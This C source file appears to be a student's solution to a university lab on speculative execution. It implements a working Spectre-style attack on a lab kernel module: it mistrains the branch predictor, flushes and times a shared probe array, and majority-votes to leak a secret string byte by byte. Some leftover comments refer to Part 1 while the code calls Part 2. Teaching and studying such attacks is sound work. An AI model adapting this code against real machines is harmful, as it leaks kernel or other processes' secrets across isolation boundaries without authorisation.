 /* Exploiting Speculative Execution
 *
 * Part 2
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "lab2.h"
#include "lab2ipc.h"

//Helper functions and misc variables
uint64_t latency = 0;
uint64_t threshold = 175;

char majority(char* array, size_t size) {
	size_t max_count = 0;
	char majority_element = {0};
	for(size_t i=0; i<size; i++) {
		size_t count = 0;
		for(size_t j=0; j<size; j++) {
			if(array[j] == array[i]) {
				count++;
			}	
		}
		if(count > max_count) {
			max_count = count;
			majority_element = array[i];
		}
	}
	return majority_element;
}

/*
 * call_kernel_part2
 * Performs the COMMAND_PART2 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t offset) {
    lab2_command local_cmd;
    local_cmd.kind = COMMAND_PART2;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab 2 vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the server
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[LAB2_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        // [Part 1]- Fill this in!
        // Feel free to create helper methods as necessary.
        // Use "call_kernel_part1" to interact with the kernel module
        // Find the value of leaked_byte for offset "current_offset"
        // leaked_byte = ??
	
	size_t iter = 5;
	char leaked_byte_each_iter[iter];
	for(size_t k=0; k<iter; k++) {

	//Mistrain the branch predictor
	size_t mistraining_attempts = 10;
	uint64_t small_offset = 0;
	for(size_t t=0; t<mistraining_attempts; t++) {
		call_kernel_part2(kernel_fd, shared_memory, small_offset);	
	}
	
	//Flush the shared memory	
	for(size_t i=0; i<255; i++) {
		clflush(shared_memory+i*4096);
		//latency[i] = time_access((char*)(shared_memory+i*4096));	
		//printf("Latency = %d\n", latency[i]);	
	}	
	
	//Main call to the kernel
	call_kernel_part2(kernel_fd, shared_memory, current_offset);

	//Reload and check latency
	size_t j;
	for(j=0; j<255; j++) {
		latency = time_access((char*)(shared_memory+j*4096));
		//printf("Latency = %d\n", latency[i]);
		if(latency < threshold) {
			break;
		}	
	}

	leaked_byte_each_iter[k] = j;
	}

	leaked_byte = majority(leaked_byte_each_iter, iter);	
	//printf("j = %d\n", j);
        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }
    printf("\n\n[Lab 2 Part 2] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;

}
